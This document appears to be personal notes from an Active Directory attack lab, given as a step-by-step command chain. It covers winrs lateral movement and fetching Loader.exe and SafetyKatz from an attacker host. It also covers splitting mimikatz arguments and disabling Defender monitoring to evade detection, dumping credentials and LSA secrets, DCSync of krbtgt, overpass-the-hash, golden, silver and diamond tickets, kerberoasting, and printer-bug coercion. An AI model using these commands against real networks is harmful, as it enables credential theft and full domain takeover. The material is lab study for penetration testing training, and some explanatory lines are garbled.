<3==**Abuse using winrs**==<3
check if we can execute commands on dcorp-mgmt server and if the winrm port is open: (do this in Jenkins session)
```
	winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```
Since we can, we can try to extract creds
For that, we need to copy Loader.exe on dcorp-mgmt. Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt.
Run the following command on the reverse shell:
```
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
```
Now, copy the Loader.exe to dcorp-mgmt:
```
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```
Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt:
```
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```
Note that Windows Defender on dcorp-mgmt would detect SafetKatz execution even when used with Loader. To avoid that, let's pass encoded arguments to the Loader, go to C:\AD\Tools
```
ArgSplit.bat
sekurlsa::ekeys
```
make batch file like  and name is safety.bat
```
@echo off
set "z=s"
set "y=y"
set "x=e"
set "w=k"
set "v=e"
set "u=:"
set "t=:"
set "s=a"
set "r=s"
set "q=l"
set "p=r"
set "o=u"
set "n=k"
set "m=e"
set "l=s"
set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
echo %Pwn%
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -Args %Pwn% exit
```
Download the batch file on dcorp-ci. Run the below commands on the reverse shell:
```
iwr http://172.16.100.x/Safety.bat -OutFile C:\Users\Public\Safety.bat
```
Now, copy the Safety.bat to dcorp-mgmt:
```
echo F | xcopy C:\Users\Public\Safety.bat \\dcorp-mgmt\C$\Users\Public\Safety.bat
```
Run Safety.bat on dcorp-mgmt that use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt:
```
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Safety.bat"
```
we will find svcadmin creds (aes256 hash)
Then we will  use **==OverPass-the-Hash to use svcadmin's credentials==**
```
go to C:\AD\Tools\ArgSplit.bat in new cmd in student VM
and asktgt
```
Run the  commands in the same command prompt session
```
C:\Windows\system32>set "z=t"
C:\Windows\system32>set "y=g"
C:\Windows\system32>set "x=t"
C:\Windows\system32>set "w=k"
C:\Windows\system32>set "v=s"
C:\Windows\system32>set "u=a"
C:\Windows\system32>set "Pwn=%u%%v%%w%%x%%y%%z%"
```
Then use Rubeus
```
echo %Pwn%
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
We get CMD session !!!
Cmd session in student Vm as SVCadmin ( from this session we can try to access dcorp-dc) since svcadmin is domain adminstrator.
```
winrs -r:dcorp-dc cmd /c set username
```

---
**Derivative Local Admin**
we check if we have admin access using
```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

we connect to dcopr-admis-srv from student Vm ( since we added this user in admin group and we can have access to adminsrv )
we check if applocker is enabled
```
winrs -r:dcorp-adminsrv cmd
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

we find a rule that allows everyone to run scripts from the C:\ProgramFiles folder!
we open another PS session using 
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Enter-PSSession dcorp-adminsrv
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
we then disable firewall there on admins-srv
```
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```

	Also, we cannot run scripts using dot sourcing (. .\Invoke-Mimi.ps1) because of the Constrained Language Mode. So, we must modify Invoke-Mimi.ps1 to include the function call in the script itself and transfer the modified script (Invoke-MimiEx.ps1) to the target server.
==**Create Invoke-MimiEx.ps1**==
- Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx.ps1.
- Open Invoke-MimiEx.ps1 in PowerShell ISE (Right click on it and click Edit).
- Add "Invoke-Mimi -Command '"sekurlsa::ekeys"' " (without quotes) to the end of the file

then On student machine run the following command from a PowerShell session
```
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```
run the modified mimikatz script. 
```
.\Invoke-MimiEx.ps1
```
vola !!!

We find the credentials of the srvadmin, appadmin and websvc users. ( aes 256 hash)
In another session, use C:\AD\Tools\ArgSplit.bat
```
C:\AD\Tools\ArgSplit.bat
asktgt
RUN these one by one below
set "z=t"
set "y=g"
set "x=t"
set "w=k"
set "v=s"
set "u=a"
set "Pwn=%u%%v%%w%%x%%y%%z%"
```
then 
```
echo %Pwn%
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:srvadmin /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
WE get CMD session with srvadmin privs!!!
then check if srvadmin has admin privileges on any other machine.
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
```
we find that we have access to dcorp-mgmt
we use safetykatz to extract creds (in the same cmd ession where we have srvadmin, run)
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
echo F | xcopy C:\AD\Tools\Safety.bat \\dcorp-mgmt\C$\Users\Public\Safety.bat
```
extract creds by (this is a port forward rule so the system thinks its connecting to itself but actually its forwarding to us)
```
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```
then
```
winrs -r:dcorp-mgmt C:\Users\Public\Safety.bat
```
then we find credentials AES256 and go for overpassthehash attack using rebeus

---
**==DOMAIN CONTROLLER (DC)==**
**==extracting secrets from DC==**

```
C:\AD\Tools\ArgSplit.bat
asktgt
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
We start a process with svcadmin priv
we will then copy loader.exe to DC to extract creds and also create a port forward rule
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
winrs -r:dcorp-dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```
Since we wanna extract the LSA secrets, we will use argsplit to encode lsadump::lsa
```
C:\AD\Tools\ArgSplit.bat
[!] Argument Limit: 180 characters
[+] Enter a string: lsadump::lsa
set "z=a"
set "y=s"
set "x=l"
set "w=:"
set "v=:"
set "u=p"
set "t=m"
set "s=u"
set "r=d"
set "q=a"
set "p=s"
set "o=l"
set "Pwn=%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
```
then copy the content to the svcadmin session cmd one by one
and then run loader.exe
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /patch" "exit"
```
We have the NTLM hashes with this !!!

We can also use **DCSync** attack to get aes and ntlm of krbtgt account
run another session as svcadmin
 We are using encoded argument for "lsadump::dcsync" with argsplit
```
 C:\AD\Tools\ArgSplit.bat
[!] Argument Limit: 180 characters
[+] Enter a string: lsadump::dcsync
set "z=c"
set "y=n"
set "x=y"
set "w=s"
set "v=c"
set "u=d"
set "t=:"
set "s=:"
set "r=p"
set "q=m"
set "p=u"
set "o=d"
set "n=a"
set "m=s"
set "l=l"
set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
```
run each command on svcadmin session
then run
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:dcorp\krbtgt" "exit"
```
to do the dcsync
after the credentials, we can use to make a golden ticket (in admin session in student VM)
Use the below Rubeus command to generate an OPSEC friendly command for Golden ticket. Note that 3 LDAP queries are sent to the DC to retrieve the required information. We will once again use ArgsSplit.bat to encode "golden":
```
C:\AD\Tools\ArgSplit.bat
[!] Argument Limit: 180 characters
[+] Enter a string: golden
set "z=n"
set "y=e"
set "x=d"
set "w=l"
set "v=o"
set "u=g"
set "Pwn=%u%%v%%w%%x%%y%%z%"
```
```
use aes hash of Administrator

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

this will give us a command to forge a golden ticket. like this
Remember to add /ptt at the end of the generated command to inject it in the current process. Once the ticket is injected, we can access resources in the domain.
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:35 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```
with this, the ticket will be imported 
then we will try to access Dcorp-DC
```
winrs -r:dcorp-dc cmd
set username
set computername
```
This is how we get access to DC using ticket
there are other ways as well from the lab material but overall is the same idea.

---
Silver ticket for HTTP and WMI
```
C:\AD\Tools\ArgSplit.bat
[!] Argument Limit: 180 characters
[+] Enter a string: silver
set "z=r"
set "y=e"
set "x=v"
set "w=l"
set "v=i"
set "u=s"
set "Pwn=%u%%v%%w%%x%%y%%z%"
```

You can also use aes256 keys in place of NTLM hash: we use hash of the dcorp-dc$(rc4) ntlm 
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
and we import the silver ticket successfully.

make sure rc4 is correct or else it iwll not work
then check if the ticket is correct
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn%
```
We have the HTTP service ticket for dcorp-dc, let?s try accessing it using winrs. Note that we are using FQDN of dcorp-dc as that is what the service ticket has:
```
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
```

We have another ways as well in OBJ 9

---

==**DIAMOND ticket attack**==
Argsplit for diamond from elevated shell on student VM

then run this command 

```
C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- **C:\AD\Tools\Rubeus.exe**: This is the path to the Rubeus executable, which is used for various Kerberos-related tasks.
- **diamond**: This is a specific operation or command within Rubeus. It typically indicates the use of Kerberos ticket-granting features.
- **/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848**: This is the Kerberos key used to encrypt/decrypt tickets. It's provided in hexadecimal format.
- **/tgtdeleg**: This option requests a Ticket Granting Ticket (TGT) that can be used for delegation, allowing the user to act on behalf of another user.
- **/enctype**
    : Specifies the encryption type for the tickets. AES (Advanced Encryption Standard) is a common choice.
- **/ticketuser**
    : This specifies the user account for which the ticket is being requested—in this case, the "administrator" account.
- **/domain**
    **.moneycorp.local**: This indicates the domain in which the user account resides.
- **/dc** **.dollarcorp.moneycorp.local**: This specifies the Domain Controller (DC) to be used for the operation.
- **/ticketuserid:500**: This specifies the user ID (in this case, 500) of the account for which the ticket is requested. User ID 500 typically corresponds to the built-in administrator account.
- **/groups:512**: This indicates the group ID (in this case, 512), which typically represents the "Domain Admins" group.
- **/createnetonly:C:\Windows\System32\cmd.exe**: This option creates a network logon session that allows the execution of a command (in this case, cmd.exe) without needing a full interactive logon.
- **/show**: This option typically instructs Rubeus to display the details of the ticket being created or used.
- **/ptt**: This stands for "Pass the Ticket," a technique that allows you to use the Kerberos ticket for authentication without needing to enter credentials.
then try to access 

>winrs -r:dcorp-dc cmd

Works !!!

---
==Modify security descriptors + silver ticket attack== obj 13

get a session of cmd as svcadmin and try to connect with DC to check if it works. The come out of DC, run these commands
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```
then we can run query suing
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```

---
Learning obj 14
==Using kerberoast to crack password of sql server service account==
MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local -flag

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN
```
we then see svcadmin is a domian admin and has an SPN

we find the hash using rebues and then crack using JTP

---
Obj 15
==Find a server in the dcorp domain where Unconstrained Delegation is enabled.==

```
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```
we get 2 results
DCORP-DC
DCORP-APPSRV

since we need admin access Unconstrained delegation, we had app admin hashes from previous steps.

we do argsplit for asktgt
and then we run
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
in the new process
run
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```

We can use multiple methods now to copy Rubeus to dcorp-appsrv to

### **Exploit Printer Bug for Escalation to Enterprise Admins Privileges**
- Run the below command from the new process running `appadmin` -:
- echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe /Y
to run rubues in listener mode
- winrs -r:dcorp-appsrv cmd
- C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
this is nw looking for a tgt if any thing happens

then we force authentication
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

then - On the `Rubeus` listener, we can see the TGT of `dcorp-dc$` 
Copy the base64 encoded ticket and Use Rubeus with Base64 Encoded Ticket on Student VM for SafetyKatz DCSync Command (Run the below command from an elevated prompt)

rest follow OBJ 15

---


